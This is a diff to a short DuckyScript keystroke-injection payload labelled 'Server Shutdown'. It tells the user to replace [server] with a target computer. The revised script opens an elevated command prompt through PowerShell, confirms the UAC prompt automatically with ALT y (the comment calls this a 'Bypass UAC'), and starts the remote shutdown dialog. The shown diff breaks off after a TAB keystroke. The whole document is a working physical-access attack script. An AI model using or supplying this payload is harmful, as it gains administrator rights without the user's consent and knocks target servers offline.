@@ -1,15 +1,13 @@
-REM Server Shutdown. Replace [server] with you target computer.
-REM Seconds: 9.15
-DELAY 1000
-GUI r
-DELAY 750
-STRING cmd.exe
-CTRL-SHIFT ENTER
+REM Server Shutdown. Replace [server] with you target computer. Bypass UAC
+REM Seconds: 12.5
+DELAY 2000
+WINDOWS r
 DELAY 200
-LEFTARROW
+STRING powershell Start-Process cmd.exe -Verb runAs
 ENTER
-ENTER
-DELAY 1000
+DELAY 2000
+ALT y
+DELAY 500
 STRING shutdown -i
 ENTER
 TAB
